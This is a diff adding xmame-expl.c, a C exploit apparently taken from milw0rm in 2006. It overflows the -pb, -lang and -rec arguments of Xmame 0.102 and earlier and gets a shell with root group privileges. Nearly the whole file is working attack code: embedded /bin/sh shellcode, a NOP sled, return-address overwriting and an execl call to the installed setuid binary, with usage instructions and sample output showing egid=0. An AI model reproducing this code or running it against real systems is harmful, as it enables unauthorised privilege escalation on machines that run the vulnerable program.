@@ -1,0 +1,112 @@
+/* 	                   xmame-expl.c
+ *				by
+ *			sj (sj@2600.com)
+ *
+ * On 20th of Jan it came to my attention that Xmame suffered from several
+ * buffer overflow problems. Thinking this issue was resolved, I installed
+ * Xmame on my Ubuntu laptop, from the Ubuntu repositories which installed a 
+ * vulnerable version of Xmame.
+ * This is what prompted me to write this exploit. I realise there is a 
+ * ruby exploit out there, but that did not exploit my system, hence 
+ * another reason to write this exploit.
+ * 
+ * This code exploits Xmame 0.102 and below.
+ *
+ * The shellcode used in this exploit is taken from Mixter's buffer 
+ * overflow tutorial which can be found here: http://mixter.void.ru/exploit.html
+ *
+ * Based on what arguments you supply, this code will exploit 3 of 
+ * the vulnerabilities found in Xmame giving you an euid=0
+ * Read the usage.
+ *
+ * Example: 
+ * sj@tsunami:~/audit$ gcc -o xmame-expl xmame-expl.c 
+ * sj@tsunami:~/audit$ ./xmame-expl 1
+ * Using -pb overflow method
+ * info: trying to parse: /etc/xmame/xmamerc
+ * error: /etc/xmame/xmamerc(71): unknown option joyusb-calibrate, ignoring line
+ * info: trying to parse: /home/sj/.xmame/xmamerc
+ * info: trying to parse: /etc/xmame/xmame-x11rc
+ * info: trying to parse: /home/sj/.xmame/xmame-x11rc
+ * sh-3.00$ id
+ * uid=1000(sj) gid=1000(sj) egid=0(root) 
+ * groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(lpadmin),108(scanner),109(admin),1000(sj)
+ * sh-3.00$ 
+ *
+ * Enjoy (:
+ */
+
+#include <stdlib.h>
+#include <stdio.h>
+
+char shellcode[]="\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"
+	         "\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";
+
+unsigned long sp(void)
+{__asm__("movl %esp, %eax");}
+
+void usage() {
+                fprintf(stderr,"Usage: ./xmame-expl <buffer_to_overflow> \n");
+                fprintf(stderr,"buffers:\n -pb     [1]");
+                fprintf(stderr,"\n -lang   [2]");
+                fprintf(stderr,"\n -rec    [3]");
+                fprintf(stderr,"\nExample: ./xmame-expl 1 \n");
+}
+
+
+int main(int argc, char *argv[])
+{
+
+	int i, offset, input, size;
+	long esp, ret;
+	long *addr_ptr;
+	char *buf, *ptr, *f;
+	offset = 0;
+	esp = sp();
+	ret = esp - offset;
+
+	if(argc != 2) {
+		usage();
+		return 1;
+	}
+	input=atoi(argv[1]);
+	switch(input) {
+		case  1: 	printf("Using -pb overflow method\n");
+				size=1037;
+				f="-pb";
+				break;
+		case 2:		printf("Using -lang overflow method\n");
+				size=1057;
+				f="-lang";
+				break;
+		case 3:		printf("Using -rec overflow method\n");
+				size=1057;
+				f="-rec";
+				break;
+		
+		default:	usage();
+				return 1;
+	}
+	buf=malloc(size);
+	ptr = buf;
+	addr_ptr = (long *) ptr;
+	for(i=0; i<size; i+=4)
+		*(addr_ptr++) = ret;
+
+	for(i=0; i < 590; i++)
+		buf[i] = '\x90';
+
+	ptr = buf + 590;
+	for(i=0; i < strlen(shellcode); i++)
+		*(ptr++) = shellcode[i];
+
+	buf[size-1]=0;
+
+	
+	execl("/usr/games/xmame.x11","/usr/games/xmame.x11",f,buf,0);
+	free(buf);
+
+	return 0;
+}
+
+// milw0rm.com [2006-01-21]
